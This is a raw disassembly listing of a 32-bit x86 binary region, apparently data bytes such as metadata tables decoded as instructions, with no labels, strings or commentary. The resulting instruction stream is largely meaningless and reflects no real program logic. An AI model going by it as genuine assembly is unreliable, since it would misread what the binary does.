  40469e:	9d                   	popf
  40469f:	0d 06 00 15 17       	or     $0x17150006,%eax
  4046a4:	f3 09 06             	repz or %eax,(%esi)
  4046a7:	00 f2                	add    %dh,%dl
  4046a9:	11 f3                	adc    %esi,%ebx
  4046ab:	09 0a                	or     %ecx,(%edx)
  4046ad:	00 59 04             	add    %bl,0x4(%ecx)
  4046b0:	bd 14 06 00 26       	mov    $0x26000614,%ebp
  4046b5:	01 9d 0d 06 00 7d    	add    %ebx,0x7d00060d(%ebp)
  4046bb:	0b 84 01 0a 00 58 05 	or     0x558000a(%ecx,%eax,1),%eax
  4046c2:	21 12                	and    %edx,(%edx)
  4046c4:	06                   	push   %es
  4046c5:	00 85 0f 84 01 0a    	add    %al,0xa01840f(%ebp)
  4046cb:	00 76 05             	add    %dh,0x5(%esi)
  4046ce:	21 12                	and    %edx,(%edx)
  4046d0:	06                   	push   %es
  4046d1:	00 8c 18 55 00 1e 00 	add    %cl,0x1e0055(%eax,%ebx,1)
  4046d8:	98                   	cwtl
  4046d9:	13 1c 02             	adc    (%edx,%eax,1),%ebx
  4046dc:	06                   	push   %es
  4046dd:	00 34 0c             	add    %dh,(%esp,%ecx,1)
  4046e0:	55                   	push   %ebp
  4046e1:	00 06                	add    %al,(%esi)
  4046e3:	00 13                	add    %dl,(%ebx)
  4046e5:	05 84 01 06 00       	add    $0x60184,%eax
  4046ea:	19 04 84             	sbb    %eax,(%esp,%eax,4)
  4046ed:	01 06                	add    %eax,(%esi)
  4046ef:	00 86 11 84 01 06    	add    %al,0x6018411(%esi)
  4046f5:	00 7b 0f             	add    %bh,0xf(%ebx)
  4046f8:	84 01                	test   %al,(%ecx)
  4046fa:	1e                   	push   %ds
  4046fb:	00 94 0f 42 12 06 00 	add    %dl,0x61242(%edi,%ecx,1)
  404702:	1a 12                	sbb    (%edx),%dl
  404704:	9d                   	popf
  404705:	0d 06 00 67 00       	or     $0x670006,%eax
  40470a:	9d                   	popf
  40470b:	0d 06 00 94 0d       	or     $0xd940006,%eax
  404710:	9d                   	popf
  404711:	0d 06 00 dc 0d       	or     $0xddc0006,%eax
  404716:	37                   	aaa
  404717:	18 06                	sbb    %al,(%esi)
  404719:	00 09                	add    %cl,(%ecx)
  40471b:	0e                   	push   %cs
  40471c:	9d                   	popf
  40471d:	0d 22 00 8a 0e       	or     $0xe8a0022,%eax
  404722:	18 14 06             	sbb    %dl,(%esi,%eax,1)
  404725:	00 c3                	add    %al,%bl
  404727:	18 a5 0c 06 00 bf    	sbb    %ah,-0x40fff9f4(%ebp)
  40472d:	0c a5                	or     $0xa5,%al
  40472f:	0c 06                	or     $0x6,%al
  404731:	00 21                	add    %ah,(%ecx)
  404733:	05 a5 0c 06 00       	add    $0x60ca5,%eax
  404738:	aa                   	stos   %al,%es:(%edi)
  404739:	02 9d 0d 06 00 01    	add    0x100060d(%ebp),%bl
  40473f:	05 f3 09 0a 00       	add    $0xa09f3,%eax
  404744:	1f                   	pop    %ds
  404745:	11 55 00             	adc    %edx,0x0(%ebp)
  404748:	0a 00                	or     (%eax),%al
  40474a:	de 14 55 00 06 00 e7 	ficoms -0x18fffa00(,%edx,2)
  404751:	03 55 00             	add    0x0(%ebp),%edx
  404754:	1a 00                	sbb    (%eax),%al
  404756:	98                   	cwtl
  404757:	04 06                	add    $0x6,%al
  404759:	10 06                	adc    %al,(%esi)
  40475b:	00 12                	add    %dl,(%edx)
  40475d:	00 01                	add    %al,(%ecx)
  40475f:	02 06                	add    (%esi),%al
  404761:	00 2e                	add    %ch,(%esi)
  404763:	0e                   	push   %cs
  404764:	9d                   	popf
  404765:	0d 0e 00 d2 0f       	or     $0xfd2000e,%eax
  40476a:	c2 0b 06             	ret    $0x60b
  40476d:	00 db                	add    %bl,%bl
  40476f:	11 9d 0d 06 00 dd    	adc    %ebx,-0x22fff9f3(%ebp)
  404775:	04 9d                	add    $0x9d,%al
  404777:	0d 26 00 a1 0f       	or     $0xfa10026,%eax
  40477c:	9b                   	fwait
  40477d:	10 26                	adc    %ah,(%esi)
  40477f:	00 66 13             	add    %ah,0x13(%esi)
  404782:	9b                   	fwait
  404783:	10 26                	adc    %ah,(%esi)
  404785:	00 c2                	add    %al,%dl
  404787:	10 9b 10 1a 00 ba    	adc    %bl,-0x45ffe5f0(%ebx)
  40478d:	10 7f 12             	adc    %bh,0x12(%edi)
  404790:	26 00 7e 13          	add    %bh,%es:0x13(%esi)
  404794:	9b                   	fwait
  404795:	10 06                	adc    %al,(%esi)
  404797:	00 48 0f             	add    %cl,0xf(%eax)
  40479a:	9d                   	popf
  40479b:	0d 06 00 29 13       	or     $0x13290006,%eax
  4047a0:	37                   	aaa
  4047a1:	18 06                	sbb    %al,(%esi)
  4047a3:	00 32                	add    %dh,(%edx)
  4047a5:	0f 9d 0d 06 00 b5 0d 	setge  0xdb50006
  4047ac:	37                   	aaa
  4047ad:	18 06                	sbb    %al,(%esi)
  4047af:	00 4e 04             	add    %cl,0x4(%esi)
  4047b2:	37                   	aaa
  4047b3:	18 06                	sbb    %al,(%esi)
  4047b5:	00 22                	add    %ah,(%edx)
  4047b7:	04 37                	add    $0x37,%al
  4047b9:	18 06                	sbb    %al,(%esi)
  4047bb:	00 f1                	add    %dh,%cl
  4047bd:	0d 37 18 06 00       	or     $0x61837,%eax
  4047c2:	3d 04 37 18 06       	cmp    $0x6183704,%eax
  4047c7:	00 1b                	add    %bl,(%ebx)
  4047c9:	0f 37                	getsec
  4047cb:	18 06                	sbb    %al,(%esi)
  4047cd:	00 e3                	add    %ah,%bl
  4047cf:	10 9d 0d 06 00 ca    	adc    %bl,-0x35fff9f3(%ebp)
  4047d5:	17                   	pop    %ss
  4047d6:	9d                   	popf
  4047d7:	0d 06 00 5e 14       	or     $0x145e0006,%eax
  4047dc:	7f 12                	jg     0x4047f0
  4047de:	06                   	push   %es
  4047df:	00 ba 04 9d 0d 00    	add    %bh,0xd9d04(%edx)
  4047e5:	00 00                	add    %al,(%eax)
  4047e7:	00 bd 00 00 00 00    	add    %bh,0x0(%ebp)
  4047ed:	00 01                	add    %al,(%ecx)
  4047ef:	00 01                	add    %al,(%ecx)
  4047f1:	00 01                	add    %al,(%ecx)
  4047f3:	00 10                	add    %dl,(%eax)
  4047f5:	00 78 0d             	add    %bh,0xd(%eax)
  4047f8:	5a                   	pop    %edx
  4047f9:	16                   	push   %ss
  4047fa:	3d 00 01 00 01       	cmp    $0x1000100,%eax
  4047ff:	00 81 01 10 00 aa    	add    %al,-0x55ffefff(%ecx)
  404805:	13 5a 16             	adc    0x16(%edx),%ebx
  404808:	3d 00 01 00 03       	cmp    $0x3000100,%eax
  40480d:	00 81 01 10 00 a0    	add    %al,-0x5fffefff(%ecx)
  404813:	15 fc 0e 3d 00       	adc    $0x3d0efc,%eax
  404818:	13 00                	adc    (%eax),%eax
  40481a:	06                   	push   %es
  40481b:	00 00                	add    %al,(%eax)
  40481d:	00 10                	add    %dl,(%eax)
  40481f:	00 f8                	add    %bh,%al
  404821:	0f f3 0c 3d 00 1f 00 	psllq  0x25001f00(,%edi,1),%mm1
  404828:	25 
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 10                	add    %dl,(%eax)
  40482d:	00 ca                	add    %cl,%dl
  40482f:	13 44 11 3d          	adc    0x3d(%ecx,%edx,1),%eax
  404833:	00 1f                	add    %bl,(%edi)
  404835:	00 27                	add    %ah,(%edi)
  404837:	00 81 01 10 00 11    	add    %al,0x11001001(%ecx)
  40483d:	0e                   	push   %cs
  40483e:	44                   	inc    %esp
  40483f:	11 3d 00 1f 00 2e    	adc    %edi,0x2e001f00
  404845:	00 81 01 10 00 8b    	add    %al,-0x74ffefff(%ecx)
  40484b:	10 44 11 3d          	adc    %al,0x3d(%ecx,%edx,1)
  40484f:	00 1f                	add    %bl,(%edi)
  404851:	00 30                	add    %dh,(%eax)
  404853:	00 81 01 10 00 3a    	add    %al,0x3a001001(%ecx)
  404859:	12 44 11 3d          	adc    0x3d(%ecx,%edx,1),%al
  40485d:	00 1f                	add    %bl,(%edi)
  40485f:	00 31                	add    %dh,(%ecx)
  404861:	00 81 01 10 00 2e    	add    %al,0x2e001001(%ecx)
  404867:	0d 44 11 3d 00       	or     $0x3d1144,%eax
  40486c:	1f                   	pop    %ds
  40486d:	00 37                	add    %dh,(%edi)
  40486f:	00 81 01 10 00 34    	add    %al,0x34001001(%ecx)
  404875:	12 44 11 3d          	adc    0x3d(%ecx,%edx,1),%al
  404879:	00 20                	add    %ah,(%eax)
  40487b:	00 39                	add    %bh,(%ecx)
  40487d:	00 81 01 10 00 83    	add    %al,-0x7cffefff(%ecx)
  404883:	0c 44                	or     $0x44,%al
  404885:	11 3d 00 20 00 3f    	adc    %edi,0x3f002000
  40488b:	00 81 01 10 00 89    	add    %al,-0x76ffefff(%ecx)
  404891:	18 44 11 3d          	sbb    %al,0x3d(%ecx,%edx,1)
  404895:	00 20                	add    %ah,(%eax)
  404897:	00 42 00             	add    %al,0x0(%edx)
  40489a:	81 01 10 00 99 15    	addl   $0x15990010,(%ecx)
  4048a0:	7b 15                	jnp    0x4048b7
  4048a2:	3d 00 21 00 47       	cmp    $0x47002100,%eax
  4048a7:	00 01                	add    %al,(%ecx)
  4048a9:	00 10                	add    %dl,(%eax)
  4048ab:	00 a6 00 a4 0d 3d    	add    %ah,0x3d0da400(%esi)
  4048b1:	00 22                	add    %ah,(%edx)
  4048b3:	00 4c 00 81          	add    %cl,-0x7f(%eax,%eax,1)
  4048b7:	01 10                	add    %edx,(%eax)
  4048b9:	00 9f 00 a4 0d 3d    	add    %bl,0x3d0da400(%edi)
  4048bf:	00 29                	add    %ch,(%ecx)
  4048c1:	00 53 00             	add    %dl,0x0(%ebx)
  4048c4:	00 01                	add    %al,(%ecx)
  4048c6:	00 00                	add    %al,(%eax)
  4048c8:	c6 00 00             	movb   $0x0,(%eax)
  4048cb:	00 3d 00 29 00 55    	add    %bh,0x55002900
  4048d1:	00 02                	add    %al,(%edx)
  4048d3:	01 00                	add    %eax,(%eax)
  4048d5:	00 6a 01             	add    %ch,0x1(%edx)
  4048d8:	00 00                	add    %al,(%eax)
  4048da:	d1 00                	roll   $1,(%eax)
  4048dc:	2a 00                	sub    (%eax),%al
  4048de:	55                   	push   %ebp
  4048df:	00 83 01 10 00 6d    	add    %al,0x6d001001(%ebx)
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	00 3d 00 2e 00 55    	add    %bh,0x55002e00
  4048ed:	00 15 01 00 00 38    	add    %dl,0x38000001
  4048f3:	00 00                	add    %al,(%eax)
  4048f5:	00 05 01 2f 00 55    	add    %al,0x55002f01
  4048fb:	00 16                	add    %dl,(%esi)
  4048fd:	00 eb                	add    %ch,%bl
  4048ff:	14 90                	adc    $0x90,%al
  404901:	05 16 00 f8 14       	add    $0x14f80016,%eax
  404906:	90                   	nop
  404907:	05 16 00 82 0e       	add    $0xe820016,%eax
  40490c:	90                   	nop
  40490d:	05 16 00 fa 0c       	add    $0xcfa0016,%eax
  404912:	90                   	nop
  404913:	05 16 00 7d 10       	add    $0x107d0016,%eax
  404918:	90                   	nop
  404919:	05 16 00 0c 05       	add    $0x50c0016,%eax
  40491e:	90                   	nop
  40491f:	05 16 00 2e 18       	add    $0x182e0016,%eax
  404924:	90                   	nop
  404925:	05 16 00 c8 01       	add    $0x1c80016,%eax
  40492a:	90                   	nop
  40492b:	05 16 00 fd 06       	add    $0x6fd0016,%eax
  404930:	90                   	nop
  404931:	05 16 00 b6 06       	add    $0x6b60016,%eax
  404936:	90                   	nop
  404937:	05 16 00 f7 06       	add    $0x6f70016,%eax
  40493c:	93                   	xchg   %eax,%ebx
  40493d:	05 16 00 b9 0b       	add    $0xbb90016,%eax
  404942:	90                   	nop
  404943:	05 16 00 ad 00       	add    $0xad0016,%eax
  404948:	97                   	xchg   %eax,%edi
  404949:	05 16 00 4a 0e       	add    $0xe4a0016,%eax
  40494e:	90                   	nop
  40494f:	05 16 00 9c 01       	add    $0x19c0016,%eax
  404954:	90                   	nop
  404955:	05 16 00 af 02       	add    $0x2af0016,%eax
  40495a:	90                   	nop
  40495b:	05 16 00 b2 17       	add    $0x17b20016,%eax
  404960:	90                   	nop
  404961:	05 16 00 f2 0f       	add    $0xff20016,%eax
  404966:	90                   	nop
  404967:	05 11 00 bb 03       	add    $0x3bb0011,%eax
  40496c:	9b                   	fwait
  40496d:	05 11 00 a0 03       	add    $0x3a00011,%eax
  404972:	9f                   	lahf
  404973:	05 11 00 70 03       	add    $0x3700011,%eax
  404978:	a3 05 11 00 06       	mov    %eax,0x6001105
  40497d:	03 a7 05 11 00 88    	add    -0x77ffeefb(%edi),%esp
  404983:	03 a7 05 11 00 eb    	add    -0x14ffeefb(%edi),%esp
  404989:	02 aa 05 11 00 ce    	add    -0x31ffeefb(%edx),%ch
  40498f:	02 ae 05 31 00 b4    	add    -0x4bffcefb(%esi),%ch
  404995:	02 b1 05 11 00 22    	add    0x22001105(%ecx),%dh
  40499b:	03 aa 05 11 00 56    	add    0x56001105(%edx),%ebp
  4049a1:	03 4f 03             	add    0x3(%edi),%ecx
  4049a4:	11 00                	adc    %eax,(%eax)
  4049a6:	38 03                	cmp    %al,(%ebx)
  4049a8:	ae                   	scas   %es:(%edi),%al
  4049a9:	05 11 00 39 11       	add    $0x11390011,%eax
  4049ae:	aa                   	stos   %al,%es:(%edi)
  4049af:	05 16 00 d6 0f       	add    $0xfd60016,%eax
  4049b4:	b4 05                	mov    $0x5,%ah
  4049b6:	31 00                	xor    %eax,(%eax)
  4049b8:	67 01 90 05 16       	add    %edx,0x1605(%bx,%si)
  4049bd:	00 e8                	add    %ch,%al
  4049bf:	13 b9 05 51 80 ab    	adc    -0x547faefb(%ecx),%edi
  4049c5:	0b 4f 03             	or     0x3(%edi),%ecx
  4049c8:	51                   	push   %ecx
  4049c9:	80 a7 0b 4f 03 51 80 	andb   $0x80,0x51034f0b(%edi)
  4049d0:	9e                   	sahf
  4049d1:	0b 4f 03             	or     0x3(%edi),%ecx
  4049d4:	51                   	push   %ecx
  4049d5:	80 82 0b 4f 03 21 00 	addb   $0x0,0x21034f0b(%edx)
  4049dc:	32 18                	xor    (%eax),%bl
  4049de:	a3 05 21 00 13       	mov    %eax,0x13002105
  4049e3:	18 a3 05 31 00 d6    	sbb    %ah,-0x29ffcefb(%ebx)
  4049e9:	15 a3 05 33 01       	adc    $0x13305a3,%eax
  4049ee:	e5 00                	in     $0x0,%eax
  4049f0:	c3                   	ret
  4049f1:	05 06 06 cc 01       	add    $0x1cc0606,%eax
  4049f6:	c7 05 56 80 a1 01 ca 	movl   $0x805605ca,0x1a18056
  4049fd:	05 56 80 
  404a00:	3c 01                	cmp    $0x1,%al
  404a02:	ca 05 56             	lret   $0x5605
  404a05:	80 29 01             	subb   $0x1,(%ecx)
  404a08:	ca 05 16             	lret   $0x1605
  404a0b:	00 0b                	add    %cl,(%ebx)
  404a0d:	00 ce                	add    %cl,%dh
  404a0f:	05 50 20 00 00       	add    $0x2050,%eax
  404a14:	00 00                	add    %al,(%eax)
  404a16:	96                   	xchg   %eax,%esi
  404a17:	00 19                	add    %bl,(%ecx)
  404a19:	0e                   	push   %cs
  404a1a:	c3                   	ret
  404a1b:	01 01                	add    %eax,(%ecx)
  404a1d:	00 5c 21 00          	add    %bl,0x0(%ecx,%eiz,1)
  404a21:	00 00                	add    %al,(%eax)
  404a23:	00 86 18 e5 11 06    	add    %al,0x611e518(%esi)
  404a29:	00 01                	add    %al,(%ecx)
  404a2b:	00 68 21             	add    %ch,0x21(%eax)
  404a2e:	00 00                	add    %al,(%eax)
  404a30:	00 00                	add    %al,(%eax)
  404a32:	96                   	xchg   %eax,%esi
  404a33:	00 a0 13 d0 02 01    	add    %ah,0x102d013(%eax)
  404a39:	00 7c 21 00          	add    %bh,0x0(%ecx,%eiz,1)
  404a3d:	00 00                	add    %al,(%eax)
  404a3f:	00 91 00 52 0b d0    	add    %dl,-0x2ff4ae00(%ecx)
  404a45:	02 01                	add    (%ecx),%al
  404a47:	00 e8                	add    %ch,%al
  404a49:	21 00                	and    %eax,(%eax)
  404a4b:	00 00                	add    %al,(%eax)
  404a4d:	00 91 18 eb 11 c3    	add    %dl,-0x3cee14e8(%ecx)
  404a53:	01 01                	add    %eax,(%ecx)
  404a55:	00 a4 22 00 00 00 00 	add    %ah,0x0(%edx,%eiz,1)
  404a5c:	96                   	xchg   %eax,%esi
  404a5d:	08 30                	or     %dh,(%eax)
  404a5f:	16                   	push   %ss
  404a60:	eb 05                	jmp    0x404a67
  404a62:	01 00                	add    %eax,(%eax)
  404a64:	ab                   	stos   %eax,%es:(%edi)
  404a65:	22 00                	and    (%eax),%al
  404a67:	00 00                	add    %al,(%eax)
  404a69:	00 96 08 3e 16 f0    	add    %dl,-0xfe9c1f8(%esi)
  404a6f:	05 01 00 b3 22       	add    $0x22b30001,%eax
  404a74:	00 00                	add    %al,(%eax)
  404a76:	00 00                	add    %al,(%eax)
  404a78:	96                   	xchg   %eax,%esi
  404a79:	08 14 16             	or     %dl,(%esi,%edx,1)
  404a7c:	f6 05 02 00 ba 22 00 	testb  $0x0,0x22ba0002
  404a83:	00 00                	add    %al,(%eax)
  404a85:	00 96 08 22 16 fb    	add    %dl,-0x4e9ddf8(%esi)
  404a8b:	05 02 00 c2 22       	add    $0x22c20002,%eax
  404a90:	00 00                	add    %al,(%eax)
  404a92:	00 00                	add    %al,(%eax)
  404a94:	91                   	xchg   %eax,%ecx
  404a95:	08 d4                	or     %dl,%ah
  404a97:	10 01                	adc    %al,(%ecx)
  404a99:	06                   	push   %es
  404a9a:	03 00                	add    (%eax),%eax
  404a9c:	c9                   	leave
  404a9d:	22 00                	and    (%eax),%al
  404a9f:	00 00                	add    %al,(%eax)
  404aa1:	00 91 08 df 10 06    	add    %dl,0x610df08(%ecx)
  404aa7:	06                   	push   %es
  404aa8:	03 00                	add    (%eax),%eax
  404aaa:	d1 22                	shll   $1,(%edx)
  404aac:	00 00                	add    %al,(%eax)
  404aae:	00 00                	add    %al,(%eax)
  404ab0:	91                   	xchg   %eax,%ecx
  404ab1:	08 77 09             	or     %dh,0x9(%edi)
  404ab4:	0c 06                	or     $0x6,%al
  404ab6:	04 00                	add    $0x0,%al
  404ab8:	d8 22                	fsubs  (%edx)
  404aba:	00 00                	add    %al,(%eax)
  404abc:	00 00                	add    %al,(%eax)
  404abe:	91                   	xchg   %eax,%ecx
  404abf:	08 86 09 10 06 04    	or     %al,0x4061009(%esi)
  404ac5:	00 e0                	add    %ah,%al
  404ac7:	22 00                	and    (%eax),%al
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	00 91 08 ad 15 0c    	add    %dl,0xc15ad08(%ecx)
  404ad1:	06                   	push   %es
  404ad2:	05 00 e7 22 00       	add    $0x22e700,%eax
  404ad7:	00 00                	add    %al,(%eax)
  404ad9:	00 91 08 b8 15 10    	add    %dl,0x1015b808(%ecx)
  404adf:	06                   	push   %es
  404ae0:	05 00 ef 22 00       	add    $0x22ef00,%eax
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	00 91 08 2b 09 15    	add    %dl,0x15092b08(%ecx)
  404aed:	06                   	push   %es
  404aee:	06                   	push   %es
  404aef:	00 f6                	add    %dh,%dh
  404af1:	22 00                	and    (%eax),%al
  404af3:	00 00                	add    %al,(%eax)
  404af5:	00 91 08 39 09 1a    	add    %dl,0x1a093908(%ecx)
  404afb:	06                   	push   %es
  404afc:	06                   	push   %es
  404afd:	00 fe                	add    %bh,%dh
  404aff:	22 00                	and    (%eax),%al
  404b01:	00 00                	add    %al,(%eax)
  404b03:	00 96 08 7d 02 d0    	add    %dl,-0x2ffd82f8(%esi)
  404b09:	02 07                	add    (%edi),%al
  404b0b:	00 05 23 00 00 00    	add    %al,0x23
  404b11:	00 96 08 8d 02 20    	add    %dl,0x20028d08(%esi)
  404b17:	06                   	push   %es
  404b18:	07                   	pop    %es
  404b19:	00 0d 23 00 00 00    	add    %cl,0x23
  404b1f:	00 91 08 32 02 25    	add    %dl,0x25023208(%ecx)
  404b25:	06                   	push   %es
  404b26:	08 00                	or     %al,(%eax)
  404b28:	14 23                	adc    $0x23,%al
  404b2a:	00 00                	add    %al,(%eax)
  404b2c:	00 00                	add    %al,(%eax)
  404b2e:	91                   	xchg   %eax,%ecx
  404b2f:	08 d7                	or     %dl,%bh
  404b31:	09 15 06 08 00 1b    	or     %edx,0x1b000806
  404b37:	23 00                	and    (%eax),%eax
  404b39:	00 00                	add    %al,(%eax)
  404b3b:	00 91 08 e0 09 1a    	add    %dl,0x1a09e008(%ecx)
  404b41:	06                   	push   %es
  404b42:	08 00                	or     %al,(%eax)
  404b44:	23 23                	and    (%ebx),%esp
  404b46:	00 00                	add    %al,(%eax)
  404b48:	00 00                	add    %al,(%eax)
  404b4a:	96                   	xchg   %eax,%esi
  404b4b:	08 d9                	or     %bl,%cl
  404b4d:	0c 8a                	or     $0x8a,%al
  404b4f:	02 09                	add    (%ecx),%cl
  404b51:	00 2a                	add    %ch,(%edx)
  404b53:	23 00                	and    (%eax),%eax
  404b55:	00 00                	add    %al,(%eax)
  404b57:	00 96 08 e6 0c 2c    	add    %dl,0x2c0ce608(%esi)
  404b5d:	00 09                	add    %cl,(%ecx)
  404b5f:	00 32                	add    %dh,(%edx)
  404b61:	23 00                	and    (%eax),%eax
  404b63:	00 00                	add    %al,(%eax)
  404b65:	00 96 08 f8 0a d0    	add    %dl,-0x2ff507f8(%esi)
  404b6b:	02 0a                	add    (%edx),%cl
  404b6d:	00 39                	add    %bh,(%ecx)
  404b6f:	23 00                	and    (%eax),%eax
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 96 08 09 0b 20    	add    %dl,0x200b0908(%esi)
  404b79:	06                   	push   %es
  404b7a:	0a 00                	or     (%eax),%al
  404b7c:	44                   	inc    %esp
  404b7d:	23 00                	and    (%eax),%eax
  404b7f:	00 00                	add    %al,(%eax)
  404b81:	00 96 00 03 16 c3    	add    %dl,-0x3ce9fd00(%esi)
  404b87:	01 0b                	add    %ecx,(%ebx)
  404b89:	00 e4                	add    %ah,%ah
  404b8b:	26 00 00             	add    %al,%es:(%eax)
  404b8e:	00 00                	add    %al,(%eax)
  404b90:	91                   	xchg   %eax,%ecx
  404b91:	00 e9                	add    %ch,%cl
  404b93:	09 a5 01 0b 00 04    	or     %esp,0x4000b01(%ebp)
  404b99:	27                   	daa
  404b9a:	00 00                	add    %al,(%eax)
  404b9c:	00 00                	add    %al,(%eax)
  404b9e:	91                   	xchg   %eax,%ecx
  404b9f:	00 01                	add    %al,(%ecx)
  404ba1:	06                   	push   %es
  404ba2:	36 00 0c 00          	add    %cl,%ss:(%eax,%eax,1)
  404ba6:	20 27                	and    %ah,(%edi)
  404ba8:	00 00                	add    %al,(%eax)
  404baa:	00 00                	add    %al,(%eax)
  404bac:	91                   	xchg   %eax,%ecx
  404bad:	00 ef                	add    %ch,%bh
  404baf:	06                   	push   %es
  404bb0:	29 06                	sub    %eax,(%esi)
  404bb2:	0d 00 34 27 00       	or     $0x273400,%eax
  404bb7:	00 00                	add    %al,(%eax)
  404bb9:	00 96 00 57 15 c3    	add    %dl,-0x3ceaa900(%esi)
  404bbf:	01 11                	add    %edx,(%ecx)
  404bc1:	00 a8 27 00 00 00    	add    %ch,0x27(%eax)
  404bc7:	00 96 00 d4 01 34    	add    %dl,0x3401d400(%esi)
  404bcd:	06                   	push   %es
  404bce:	11 00                	adc    %eax,(%eax)
  404bd0:	f0 29 00             	lock sub %eax,(%eax)
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	00 96 00 db 03 06    	add    %dl,0x603db00(%esi)
  404bdb:	06                   	push   %es
  404bdc:	12 00                	adc    (%eax),%al
  404bde:	78 2b                	js     0x404c0b
  404be0:	00 00                	add    %al,(%eax)
  404be2:	00 00                	add    %al,(%eax)
  404be4:	96                   	xchg   %eax,%esi
  404be5:	00 90 15 a5 01 13    	add    %dl,0x1301a515(%eax)
  404beb:	00 0c 2c             	add    %cl,(%esp,%ebp,1)
  404bee:	00 00                	add    %al,(%eax)
  404bf0:	00 00                	add    %al,(%eax)
  404bf2:	91                   	xchg   %eax,%ecx
  404bf3:	00 15 0b a5 01 14    	add    %dl,0x1401a50b
  404bf9:	00 58 2c             	add    %bl,0x2c(%eax)
  404bfc:	00 00                	add    %al,(%eax)
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	91                   	xchg   %eax,%ecx
  404c01:	18 eb                	sbb    %ch,%bl
  404c03:	11 c3                	adc    %eax,%ebx
  404c05:	01 15 00 64 2c 00    	add    %edx,0x2c6400
  404c0b:	00 00                	add    %al,(%eax)
  404c0d:	00 96 00 fa 0c c3    	add    %dl,-0x3cf30600(%esi)
  404c13:	01 15 00 80 2f 00    	add    %edx,0x2f8000
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	00 86 18 e5 11 06    	add    %al,0x611e518(%esi)
  404c21:	00 15 00 8c 2f 00    	add    %dl,0x2f8c00
  404c27:	00 00                	add    %al,(%eax)
  404c29:	00 96 00 d8 13 c3    	add    %dl,-0x3cec2800(%esi)
  404c2f:	01 15 00 cc 2f 00    	add    %edx,0x2fcc00
  404c35:	00 00                	add    %al,(%eax)
  404c37:	00 91 00 5f 0c d0    	add    %dl,-0x2ff3a100(%ecx)
  404c3d:	02 15 00 24 30 00    	add    0x302400,%dl
  404c43:	00 00                	add    %al,(%eax)
  404c45:	00 91 00 97 01 d0    	add    %dl,-0x2ffe6900(%ecx)
  404c4b:	02 15 00 74 30 00    	add    0x307400,%dl
  404c51:	00 00                	add    %al,(%eax)
  404c53:	00 91 00 5a 11 d0    	add    %dl,-0x2feea600(%ecx)
  404c59:	02 15 00 a4 31 00    	add    0x31a400,%dl
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	00 91 00 f7 10 d0    	add    %dl,-0x2fef0900(%ecx)
  404c67:	02 15 00 e4 31 00    	add    0x31e400,%dl
  404c6d:	00 00                	add    %al,(%eax)
  404c6f:	00 91 00 81 04 d0    	add    %dl,-0x2ffb7f00(%ecx)
  404c75:	02 15 00 2c 32 00    	add    0x322c00,%dl
  404c7b:	00 00                	add    %al,(%eax)
  404c7d:	00 86 18 e5 11 06    	add    %al,0x611e518(%esi)
  404c83:	00 15 00 38 32 00    	add    %dl,0x323800
  404c89:	00 00                	add    %al,(%eax)
  404c8b:	00 96 00 af 02 37    	add    %dl,0x3702af00(%esi)
  404c91:	02 15 00 b8 32 00    	add    0x32b800,%dl
  404c97:	00 00                	add    %al,(%eax)
  404c99:	00 96 00 4a 0b 5d    	add    %dl,0x5d0b4a00(%esi)
  404c9f:	00 15 00 30 33 00    	add    %dl,0x333000
  404ca5:	00 00                	add    %al,(%eax)
  404ca7:	00 96 00 69 0f 01    	add    %dl,0x10f6900(%esi)
  404cad:	06                   	push   %es
  404cae:	16                   	push   %ss
  404caf:	00 00                	add    %al,(%eax)
  404cb1:	35 00 00 00 00       	xor    $0x0,%eax
  404cb6:	96                   	xchg   %eax,%esi
  404cb7:	00 53 0e             	add    %dl,0xe(%ebx)
  404cba:	d0 02                	rolb   $1,(%edx)
  404cbc:	16                   	push   %ss
  404cbd:	00 28                	add    %ch,(%eax)
  404cbf:	35 00 00 00 00       	xor    $0x0,%eax
  404cc4:	96                   	xchg   %eax,%esi
  404cc5:	00 c9                	add    %cl,%cl
  404cc7:	15 c3 01 16 00       	adc    $0x1601c3,%eax
  404ccc:	98                   	cwtl
  404ccd:	35 00 00 00 00       	xor    $0x0,%eax
  404cd2:	96                   	xchg   %eax,%esi
  404cd3:	00 fe                	add    %bh,%dh
  404cd5:	14 37                	adc    $0x37,%al
  404cd7:	02 16                	add    (%esi),%dl
  404cd9:	00 80 36 00 00 00    	add    %al,0x36(%eax)
  404cdf:	00 96 00 c9 10 3a    	add    %dl,0x3a10c900(%esi)
  404ce5:	06                   	push   %es
  404ce6:	16                   	push   %ss
  404ce7:	00 d0                	add    %dl,%al
  404ce9:	36 00 00             	add    %al,%ss:(%eax)
  404cec:	00 00                	add    %al,(%eax)
  404cee:	96                   	xchg   %eax,%esi
  404cef:	00 c5                	add    %al,%ch
  404cf1:	0f c3 01             	movnti %eax,(%ecx)
  404cf4:	17                   	pop    %ss
  404cf5:	00 04 37             	add    %al,(%edi,%esi,1)
  404cf8:	00 00                	add    %al,(%eax)
  404cfa:	00 00                	add    %al,(%eax)
  404cfc:	96                   	xchg   %eax,%esi
  404cfd:	00 34 05 37 02 17 00 	add    %dh,0x170237(,%eax,1)
  404d04:	64 37                	fs aaa
  404d06:	00 00                	add    %al,(%eax)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	96                   	xchg   %eax,%esi
  404d0b:	00 a6 17 d0 02 17    	add    %ah,0x1702d017(%esi)
  404d11:	00 8c 37 00 00 00 00 	add    %cl,0x0(%edi,%esi,1)
  404d18:	96                   	xchg   %eax,%esi
  404d19:	00 9b 17 c3 01 17    	add    %bl,0x1701c317(%ebx)
  404d1f:	00 00                	add    %al,(%eax)
  404d21:	00 00                	add    %al,(%eax)
  404d23:	00 80 00 96 20 74    	add    %al,0x74209600(%eax)
  404d29:	17                   	pop    %ss
  404d2a:	43                   	inc    %ebx
  404d2b:	06                   	push   %es
  404d2c:	17                   	pop    %ss
  404d2d:	00 00                	add    %al,(%eax)
  404d2f:	00 00                	add    %al,(%eax)
  404d31:	00 80 00 96 20 61    	add    %al,0x61209600(%eax)
  404d37:	17                   	pop    %ss
  404d38:	47                   	inc    %edi
  404d39:	06                   	push   %es
  404d3a:	17                   	pop    %ss
  404d3b:	00 00                	add    %al,(%eax)
  404d3d:	00 00                	add    %al,(%eax)
